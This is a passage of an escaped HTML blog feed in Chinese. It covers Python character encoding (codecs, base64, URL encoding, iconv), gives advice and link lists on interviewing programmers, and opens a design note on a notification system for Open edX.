&lt;span class="n"&gt;Reader&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;codecs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getreader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;fh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Reader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;# &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt; ,应该尽可能让程序内部的数据都是 &amp;lt;type &amp;#39;unicode&amp;#39;&amp;gt; &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你必须对codecs模块十分小心。你传进去的东西必须是一个Unicode对象,否则它会自动将字节流作为ASCII进行解码。&lt;/p&gt;
&lt;h3 id="_6"&gt;策略&lt;/h3&gt;
&lt;p&gt;python编解码涉及的问题可能很多，上至大神下至小白，都可能受扰，为了保持简单，我们可以保持这样一种习惯:关注输入输出，内部保持unicode。&lt;/p&gt;
&lt;p&gt;每当有数据进入程序，将其解码（decode）为unicode(utf-8）&lt;/p&gt;
&lt;p&gt;当有数据从程序中输出时，将其编码（encode）为utf-8&lt;/p&gt;
&lt;p&gt;最佳实践：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最先解码(解码为unicode对象)，最后编码（输出为字节码）&lt;ul&gt;
&lt;li&gt;最先解码意味着无论何时有字节流输入，需要尽早将输入解码为Unicode&lt;/li&gt;
&lt;li&gt;最后编码意味着只有你打算将文本输出到某个地方时，才把它编码为字节流。这个输出可能是一个文件，一个数据库，一个socket等等&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;默认使用utf-8编码&lt;/li&gt;
&lt;li&gt;使用codecs和Unicode对象来简化处理&lt;ul&gt;
&lt;li&gt;codecs模块能够让我们在处理诸如文件或socket这样的流的时候能少踩一些坑。如果没有codecs提供的这个工具，你就必须将文件内容读取为字节流，然后将这个字节流解码为Unicode对象。&lt;/li&gt;
&lt;li&gt;codecs模块能够让你快速的将&lt;code&gt;字节流&lt;/code&gt;转化为&lt;code&gt;Unicode对象&lt;/code&gt;，省去很多麻烦。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="linux"&gt;linux下的一些工具&lt;/h1&gt;
&lt;h3 id="file"&gt;file&lt;/h3&gt;
&lt;p&gt;file命令用来探测给定文件的类型,&lt;/p&gt;
&lt;p&gt;参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-i：显示MIME类别。&lt;/li&gt;
&lt;li&gt;-c：详细显示指令执行过程，便于排错或分析程序执行的情形；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;file *&lt;/p&gt;
&lt;h3 id="iconv"&gt;iconv&lt;/h3&gt;
&lt;p&gt;conv命令是用来转换文件的编码方式的，比如它可以将UTF8编码的转换成GB18030的编码&lt;/p&gt;
&lt;p&gt;iconv -f encoding -t encoding inputfile&lt;/p&gt;
&lt;p&gt;iconv -f UTF-8 -t GBK file1 -o file2  //将一个UTF-8 编码的文件转换成GBK编码&lt;/p&gt;
&lt;h3 id="chardet"&gt;chardet&lt;/h3&gt;
&lt;p&gt;有时候我们不知道文件/字节流采用了什么编码，可以让chardet来猜测编码，chardet是python的一个库&lt;/p&gt;
&lt;h1 id="_7"&gt;附&lt;/h1&gt;
&lt;h3 id="transfer-encoding-syntax"&gt;传输编码语法（transfer encoding syntax）&lt;/h3&gt;
&lt;p&gt;用于处理上一层次的字符编码方案提供的字节序列。一般其功能包括两种：一是把字节序列的值映射到一套更受限制的值域内，以满足传输环境的限制，例如Email传输时Base64或者quoted-printable，都是把8位的字节编码为7位长的数据；另一是压缩字节序列的值，如LZW或者进程长度编码等无损压缩技术。&lt;/p&gt;
&lt;h6 id="base64"&gt;Base64编码&lt;/h6&gt;
&lt;p&gt;base64编码相关的部分，可以翻阅我的&lt;a href="http://blog.just4fun.site/jwt-note.html"&gt;JWT学习笔记&lt;/a&gt;中的附录部分&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Base64常用于在通常处理文本数据的场合，表示、传输、存储一些&lt;code&gt;二进制数据&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;常用于在URL、Cookie、网页中传输少量二进制数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;所谓Base64，就是说选出64个字符----小写字母a-z、大写字母A-Z、数字0-9、符号"+"、"/"（再加上作为垫字的"="，实际上是65个字符）----作为一个基本字符集。然后，其他所有符号都转换成这个字符集中的字符。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;关于base64更多的细节可以参考维基百科和&lt;a href="http://www.ruanyifeng.com/blog/2008/06/base64.html"&gt;Base64笔记&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在python中实现&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#aGVsbG8=  ， 被编码的不是应该是二进制数据吧，python的二进制默认被解析为ascii？，在这里hello无论是b&amp;#39;hello&amp;#39;还是&amp;#39;hello&amp;#39;/u&amp;#39;hello&amp;#39;，结果都一样&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;aGVsbG8=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# hello&lt;/span&gt;

&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;你好&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# \u4f60\u597d&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="c1"&gt;#5L2g5aW9&lt;/span&gt;
&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe4\xbd\xa0\xe5\xa5\xbd&lt;/span&gt;
&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# u&amp;#39;\u4f60\u597d&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# 由于标准的Base64编码后可能出现字符+和/，在URL中就不能直接作为参数，所以又有一种&amp;quot;url safe&amp;quot;的base64编码，其实就是把字符+和/分别变成-和_&lt;/span&gt;
&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;哈里谢顿&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe5\x93\x88\xe9\x87\x8c\xe8\xb0\xa2\xe9\xa1\xbf&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 5ZOI6YeM6LCi6aG/ , 有反斜杠&lt;/span&gt;
&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlsafe_b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 5ZOI6YeM6LCi6aG_&lt;/span&gt;
&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlsafe_b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# \xe5\x93\x88\xe9\x87\x8c\xe8\xb0\xa2\xe9\xa1\xbf&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3 id="url"&gt;url中的编码问题&lt;/h3&gt;
&lt;p&gt;一般而言使用urllib库中的urlencode函数就好了&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;urlencode&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;小明&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#u&amp;#39;小明&amp;#39;则需要encode为字节码&lt;/span&gt;
     &lt;span class="s1"&gt;&amp;#39;age&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;10岁&amp;#39;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;urlencode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# age=10%E5%B2%81&amp;amp;name=%E5%B0%8F%E6%98%8E&lt;/span&gt;

&lt;span class="c1"&gt;#仅对字符串进行转码可以使用quote&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;quote&lt;/span&gt;
&lt;span class="n"&gt;quote&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;小明&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;#%E5%B0%8F%E6%98%8E&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果有大量此类工作可以考虑使用&lt;a href="https://github.com/gruns/furl"&gt;furl&lt;/a&gt;&lt;/p&gt;
&lt;h3 id="_8"&gt;在线工具&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://tool.oschina.net/encode?type=4"&gt;在线编码转换&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tool.chinaz.com/Tools/urlencode.aspx"&gt;UrlEncode编码/UrlDecode解码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tool.chinaz.com/Tools/unicode.aspx"&gt;Unicode编码转换&lt;/a&gt;:还包括unix时间戳&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_9"&gt;一些细碎知识&lt;/h3&gt;
&lt;p&gt;Windows简体中文版中，ANSI是默认的编码方式。对于英文文件是ASCII编码，对于简体中文文件是GB2312编码（繁体中文版会采用Big5码）&lt;/p&gt;
&lt;h3 id="pythonunicode"&gt;python中字节流和unicode的代码视角比较&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/18193305/python-unicode-equal-comparison-failed"&gt;stackoverflow Python unicode equal comparison failed&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_10"&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81"&gt;字符编码&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://cenalulu.github.io/linux/character-encoding/"&gt;十分钟搞清字符集和字符编码&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="http://cenalulu.github.io/mysql/mysql-mojibake/"&gt;10分钟学会理解和解决MySQL乱码问题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html"&gt;字符编码笔记：ASCII，Unicode和UTF-8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.jobbole.com/50345/"&gt;Python编码和Unicode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://funhacks.net/2016/11/25/character_encoding/"&gt;Python: 熟悉又陌生的字符编码&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 28 Jun 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-06-28:decode-and-encode-note.html</guid><category>tools</category></item><item><title>如何面试程序员</title><link>/about-interview.html</link><description>&lt;p&gt;最近在客串面试官的角色，收集一些自己认为不错的资源和问题。&lt;/p&gt;
&lt;p&gt;面试别人比被人面试来得紧张&lt;/p&gt;
&lt;h1 id="_1"&gt;原则&lt;/h1&gt;
&lt;p&gt;你需要找到合适的人，而不是最牛的人&lt;/p&gt;
&lt;h1 id="_2"&gt;技术无关&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.ruanyifeng.com/blog/2010/12/how_to_interview_a_programmer.html"&gt;如何面试程序员？&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;准备工作&lt;ul&gt;
&lt;li&gt;需要新员工完成什么样的任务？&lt;/li&gt;
&lt;li&gt;怎样的人能完成这样的任务？&lt;/li&gt;
&lt;li&gt;哪些途径和方法可以发现这样的人？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察专业能力&lt;ul&gt;
&lt;li&gt;过去是未来的最好预测依据。不过，提问的重点不要仅仅是他过去的成果，更要关注在当时的环境中，他是如何决策和实施的。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察综合素质:因为人是会发展的，所以某种程度上，面试者的综合素质要比他的专业能力更重要&lt;ul&gt;
&lt;li&gt;你为什么开发软件？&lt;/li&gt;
&lt;li&gt;去年你读了几本技术书籍？&lt;/li&gt;
&lt;li&gt;去年你最喜欢的技术书籍是哪本？你从中学到了什么？&lt;/li&gt;
&lt;li&gt;平时你经常访问哪些编程类网站？&lt;/li&gt;
&lt;li&gt;你有自己的开源项目吗？业余时间你编程吗？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;考察理性思维（递进）&lt;ul&gt;
&lt;li&gt;你最喜欢的编程语言是哪种？为什么？&lt;/li&gt;
&lt;li&gt;如果允许你为这种语言加一种功能，你会加什么功能？为什么？&lt;/li&gt;
&lt;li&gt;如果允许你取消一种功能，会是什么功能？为什么？&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://www.zhihu.com/question/20042950"&gt;如何面试一个工作经验比自己高很多的人？&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果是技术岗，应该有岗位职责和技术要求，你作为技术面试官就是要看他已有的技能是否满足这个岗位。要围绕公司所应用的技术平台、产品类型、项目情况考察他的技术水准是否能够满足。&lt;/li&gt;
&lt;li&gt;对于你不了解的技术你也不要不懂装懂，如果他能用简单的描述让你听得明白，说明他的条理很清晰&lt;/li&gt;
&lt;li&gt;你可以提出几个实际工作中遇到的技术问题，请他讲讲他的理解和解决办法。&lt;/li&gt;
&lt;li&gt;技术面试之后，要了解他换工作的原因，动机，他的期望是什么，你要判断公司能否满足他的期望，他是否“像这个公司的人”，也就是要符合公司文化。双方契合，才能达到&lt;strong&gt;共赢&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;我所在单位的面试是逐级的，首先技术部门经理面试，然后技术部门上级单位总经理面试，最后和HR部门经理谈薪酬待遇。&lt;/li&gt;
&lt;li&gt;找出过去曾经困扰过你或你们团队的问题（可以是技术、运营、沟通），列明产生问题的背景，在面试中用于情景模拟&lt;/li&gt;
&lt;li&gt;询问项目过程中发生的技术难关、跨团队沟通等问题的解决上，用STAR判断真假&lt;ul&gt;
&lt;li&gt;&lt;a href="http://baike.baidu.com/subview/470818/11235965.htm#viewPageContent"&gt;STAR原则&lt;/a&gt;:situation,task,action,result&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;鉴于IT行业的特殊性，还需要考察学习能力，可以直接询问他是如何学习最新语言的&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mindhacks.cn/2011/11/04/how-to-interview-a-person-for-two-years/"&gt;怎样花两年时间去面试一个人&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="_3"&gt;参考&lt;/h1&gt;
&lt;h3 id="_4"&gt;面试官的养成&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/26240321"&gt;如何当一个好的面试官？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36820925"&gt;在面试中，有哪些面试官的反应让你感觉惊艳？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/19551593"&gt;创业公司应该如何招人？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_5"&gt;技术相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/h5bp/Front-end-Developer-Interview-Questions"&gt;Front-end-Developer-Interview-Questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/alex/what-happens-when"&gt;what-happens-when&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/skyline75489/what-happens-when-zh_CN"&gt;What-happens-when&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions"&gt;awesome-interview-questions&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#html"&gt;html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#javascript"&gt;javascript&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#python"&gt;python&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#django"&gt;django&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#ruby"&gt;ruby&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#ruby-on-rails"&gt;Ruby on Rails&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;database&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#sql"&gt;sql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#mysql"&gt;mysql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#mongodb"&gt;mongodb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#linux"&gt;linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#algorithms"&gt;algorithms&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/blakeembrey/code-problems"&gt;code-problems&lt;/a&gt;:Common code and interview problems solved in multiple languages&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hawx1993/Front-end-Interview-questions"&gt;Front-end-Interview-questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/taizilongxu/interview_python"&gt;interview_python&lt;/a&gt;:关于Python的面试题&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fex-team/interview-questions"&gt;interview-questions&lt;/a&gt;:FEX 面试问题&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/paddingme/Front-end-Web-Development-Interview-Question"&gt;Front-end-Web-Development-Interview-Question&lt;/a&gt;:前端开发面试题大收集&lt;/li&gt;
&lt;li&gt;&lt;a href="http://hit-alibaba.github.io/interview/index.html"&gt;笔试面试知识整理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/qiu-deqing/FE-interview"&gt;FE-interview&lt;/a&gt;:收集的前端面试题和答案&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jimuyouyou/node-interview-questions"&gt;node-interview-questions&lt;/a&gt;:Node.js面试题，侧重后端应用与对Node核心的理解&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ChenYilong/iOSInterviewQuestions"&gt;iOS面试题集锦&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/envyfan/AndroidReview"&gt;AndroidReview&lt;/a&gt;:Adnroid面试复习&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/arialdomartini/Back-End-Developer-Interview-Questions"&gt;Back-End-Developer-Interview-Questions
&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/monklof/Back-End-Developer-Interview-Questions"&gt;Back-End-Developer-Interview-Questions&lt;/a&gt;:后端开发面试题&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/NoonTechnology/interview_summarize"&gt;interview_summarize&lt;/a&gt;:面试总结&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_6"&gt;名企面试题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://coolshell.cn/articles/3345.html"&gt;140个Google的面试题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 14 Jun 2016 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2016-06-14:about-interview.html</guid><category>code</category></item><item><title>notification system思路、概念与实现</title><link>/notification-system-thinking-concept-and-Implementation.html</link><description>&lt;h1 id="_1"&gt;试水&lt;/h1&gt;
&lt;p&gt;水挺深，撸起你的裤管&lt;/p&gt;
&lt;h3 id="_2"&gt;缘起&lt;/h3&gt;
&lt;p&gt;最初我想为Open edX实现一套消息系统（Notification system）。通过浏览&lt;a href="https://github.com/edx"&gt;官方库&lt;/a&gt;，我们发现，官方在做类似的事:&lt;a href="https://github.com/edx/notifier"&gt;notifier&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;notifier is a django application for edX platform notifications&lt;/p&gt;
&lt;p&gt;It currently sends daily digests of new content to subscribed forums users, with a goal of eventually supporting real-time and batched notifications of various types of content across various channels (e.g. SMS).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由此可知这个库，最终会变得real-time and powerful（多种通知方式）&lt;/p&gt;
&lt;p&gt;但目前而言，似乎偏弱，且只能提供论坛消息通知，且是以邮件的方式。而我们似乎更习惯站内消息这种通知形式&lt;/p&gt;
&lt;p&gt;至于具体实现，我没细看，猜测是celery+rabbitmq，采用pub/sub模型&lt;/p&gt;
&lt;h3 id="_3"&gt;最初的思路&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;基于redis或者rabbitmq&lt;/li&gt;
&lt;li&gt;使用read-time web相关库&lt;ul&gt;
&lt;li&gt;parse&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rethinkdb/rethinkdb"&gt;rethinkdb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;meteor&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;看edx的&lt;a href="https://github.com/edx/notifier"&gt;notifier&lt;/a&gt;实现&lt;/li&gt;
&lt;li&gt;改造IM&lt;ul&gt;
&lt;li&gt;&lt;a href="http://kexun.github.io/2016/04/08/%E9%80%9A%E8%BF%87%E7%AC%AC%E4%B8%89%E6%96%B9Im%E7%B3%BB%E7%BB%9F%E6%94%B9%E9%80%A0%E7%A7%81%E4%BF%A1%E5%8A%9F%E8%83%BD/"&gt;通过第三方IM系统，改造私信功能&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;采用云服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_4"&gt;我的需求&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;私信（message）&lt;/li&gt;
&lt;li&gt;站内消息（Announce）&lt;ul&gt;
&lt;li&gt;是系统发送的消息，格式是固定的，特殊对象一般拥有&lt;strong&gt;超链接&lt;/strong&gt;（资源定位符）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;提醒（activities，Remind，类似github消息通知）&lt;ul&gt;
&lt;li&gt;可能涉及关注对象/活动/订阅/&lt;ul&gt;
&lt;li&gt;谁对一样属于谁的事物做了什么操作（someone do something in someone's something）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="_5"&gt;分析需求&lt;/h3&gt;
&lt;p&gt;通过万能的google，我们发现这类需求早就有人讨论过啦，以下是我喜欢的讨论&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/f4d7827821f1"&gt;消息系统设计与实现「上篇」&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/6bf8166b291c"&gt;消息系统设计与实现「下篇」&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/22394809"&gt;知乎的消息机制，在技术上如何设计与规划？&lt;/a&gt; ： 知乎工程师的回答&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20380990/answer/14960006"&gt;网站的消息（通知）系统一般是如何实现的？&lt;/a&gt;&lt;/li&gt;
